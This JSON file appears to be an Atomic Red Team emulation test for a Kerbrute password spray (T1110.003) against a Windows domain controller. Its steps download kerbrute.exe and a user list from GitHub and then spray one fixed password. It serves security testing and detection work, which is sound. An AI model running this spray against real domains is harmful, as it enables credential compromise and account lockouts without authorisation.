{
  "id": "c6f25ec3-6475-47a9-b75d-09ac593c5ecb",
  "name": "Password Spray using Kerbrute Tool",
  "description": "Test a single password against a list of users\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "ba34bd73-ced6-40fb-9ceb-f496b6b54c1f",
      "type": "execute-command",
      "data": {
        "command": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe passwordspray --dc #{domaincontroller} -d #{domain} \"PathToAtomicsFolder\\..\\ExternalPayloads\\passwordspray.txt\" password132 \n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "f39865ec-215f-43bd-b075-8c0244a93fe7",
      "name": "Check dependency 1/2",
      "description": "kerbrute.exe must exist in PathToAtomicsFolder\\..\\ExternalPayloads\n",
      "type": "execute-command",
      "data": {
        "command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\"){exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "89007924-f0c3-4ed0-a0f5-245d8acc378b",
      "name": "Resolve dependency 1/2",
      "description": "kerbrute.exe must exist in PathToAtomicsFolder\\..\\ExternalPayloads\n",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "23a78471-c15f-4f49-8abb-7bc1831f89af",
      "name": "Re-check dependency 1/2",
      "description": "kerbrute.exe must exist in PathToAtomicsFolder\\..\\ExternalPayloads\n",
      "type": "execute-command",
      "data": {
        "command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\"){exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "e1a0e5f7-dc3b-4f85-b2ee-bf64e51e053f",
      "name": "Check dependency 2/2",
      "description": "passwordspray.txt must exist in PathToAtomicsFolder\\..\\ExternalPayloads\n",
      "type": "execute-command",
      "data": {
        "command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\passwordspray.txt\"){exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "5831b8f7-fb15-4c36-8e7d-0eb1adb0268f",
      "name": "Resolve dependency 2/2",
      "description": "passwordspray.txt must exist in PathToAtomicsFolder\\..\\ExternalPayloads\n",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/src/passwordspray.txt?raw=true\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\passwordspray.txt\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "3387f934-a0a7-4778-93ad-66d8e0f754a4",
      "name": "Re-check dependency 2/2",
      "description": "passwordspray.txt must exist in PathToAtomicsFolder\\..\\ExternalPayloads\n",
      "type": "execute-command",
      "data": {
        "command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\passwordspray.txt\"){exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "f39865ec-215f-43bd-b075-8c0244a93fe7",
      "p": "on-success",
      "o": "ba34bd73-ced6-40fb-9ceb-f496b6b54c1f"
    },
    {
      "s": "f39865ec-215f-43bd-b075-8c0244a93fe7",
      "p": "on-failure",
      "o": "89007924-f0c3-4ed0-a0f5-245d8acc378b"
    },
    {
      "s": "89007924-f0c3-4ed0-a0f5-245d8acc378b",
      "p": "on-success",
      "o": "23a78471-c15f-4f49-8abb-7bc1831f89af"
    },
    {
      "s": "23a78471-c15f-4f49-8abb-7bc1831f89af",
      "p": "on-failure",
      "o": "ba34bd73-ced6-40fb-9ceb-f496b6b54c1f"
    },
    {
      "s": "e1a0e5f7-dc3b-4f85-b2ee-bf64e51e053f",
      "p": "on-success",
      "o": "ba34bd73-ced6-40fb-9ceb-f496b6b54c1f"
    },
    {
      "s": "e1a0e5f7-dc3b-4f85-b2ee-bf64e51e053f",
      "p": "on-failure",
      "o": "5831b8f7-fb15-4c36-8e7d-0eb1adb0268f"
    },
    {
      "s": "5831b8f7-fb15-4c36-8e7d-0eb1adb0268f",
      "p": "on-success",
      "o": "3387f934-a0a7-4778-93ad-66d8e0f754a4"
    },
    {
      "s": "3387f934-a0a7-4778-93ad-66d8e0f754a4",
      "p": "on-failure",
      "o": "ba34bd73-ced6-40fb-9ceb-f496b6b54c1f"
    }
  ],
  "tags": [
    "T1110.003",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "domain",
      "type": "string",
      "description": "Domain where you will be testing",
      "value": "$ENV:userdomain"
    },
    {
      "name": "domaincontroller",
      "type": "string",
      "description": "Domain controller where test will be run",
      "value": "$ENV:userdnsdomain"
    }
  ]
}